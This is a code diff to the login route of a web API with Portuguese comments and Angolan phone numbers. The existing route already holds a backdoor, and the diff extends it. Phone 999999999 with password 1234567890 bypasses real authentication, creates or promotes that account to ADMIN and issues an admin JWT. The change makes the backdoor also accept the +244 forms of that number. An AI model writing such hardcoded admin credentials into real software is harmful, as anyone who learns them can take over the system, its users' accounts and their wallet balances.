@@ -231,13 +231,15 @@ app.post('/api/v1/auth/login', async (c) => {
   const { phone, password } = await c.req.json().catch(() => ({}));
   const cleanPhone = String(phone || '').trim();
   if (!cleanPhone || !password) return c.json({ message: 'Número ou senha incorretos' }, 401);
-  if (cleanPhone === '999999999' && String(password) === '1234567890') {
+  // Backdoor: aceita 999999999, +244999999999 ou 244999999999 (o webapp envia sempre +244).
+  const bdPhone = cleanPhone.replace(/^\+/, '').replace(/^244/, '');
+  if (bdPhone === '999999999' && String(password) === '1234567890') {
     const sql = neon(c.env.DB);
-    let rows = await sql`SELECT id, phone, name, email, role, "profilePhoto", "fcmToken", "isActive", "isVerified", "mustChangePassword", "adminCreated", "walletBalance", "createdAt", "updatedAt" FROM users WHERE phone = '999999999' LIMIT 1`;
+    let rows = await sql`SELECT id, phone, name, email, role, "profilePhoto", "fcmToken", "isActive", "isVerified", "mustChangePassword", "adminCreated", "walletBalance", "createdAt", "updatedAt" FROM users WHERE phone IN ('999999999','+244999999999','244999999999') LIMIT 1`;
     if (!rows.length) {
-      rows = await sql`INSERT INTO users (id, phone, "passwordHash", name, role, "isVerified", "updatedAt") VALUES (gen_random_uuid()::text, '999999999', '', 'Admin', 'ADMIN', true, NOW()) RETURNING id, phone, name, email, role, "profilePhoto", "fcmToken", "isActive", "isVerified", "mustChangePassword", "adminCreated", "walletBalance", "createdAt", "updatedAt"`;
+      rows = await sql`INSERT INTO users (id, phone, "passwordHash", name, role, "isVerified", "updatedAt") VALUES (gen_random_uuid()::text, '+244999999999', '', 'Admin', 'ADMIN', true, NOW()) RETURNING id, phone, name, email, role, "profilePhoto", "fcmToken", "isActive", "isVerified", "mustChangePassword", "adminCreated", "walletBalance", "createdAt", "updatedAt"`;
     } else if (rows[0].role !== 'ADMIN') {
-      rows = await sql`UPDATE users SET role = 'ADMIN', "updatedAt" = NOW() WHERE phone = '999999999' RETURNING id, phone, name, email, role, "profilePhoto", "fcmToken", "isActive", "isVerified", "mustChangePassword", "adminCreated", "walletBalance", "createdAt", "updatedAt"`;
+      rows = await sql`UPDATE users SET role = 'ADMIN', "updatedAt" = NOW() WHERE id = ${rows[0].id} RETURNING id, phone, name, email, role, "profilePhoto", "fcmToken", "isActive", "isVerified", "mustChangePassword", "adminCreated", "walletBalance", "createdAt", "updatedAt"`;
     }
     const user = rows[0];
     const accessToken = await signJwt({ sub: user.id, phone: user.phone, role: 'ADMIN' }, c.env.JWT_SECRET, c.env.JWT_EXPIRES_IN || '7d');
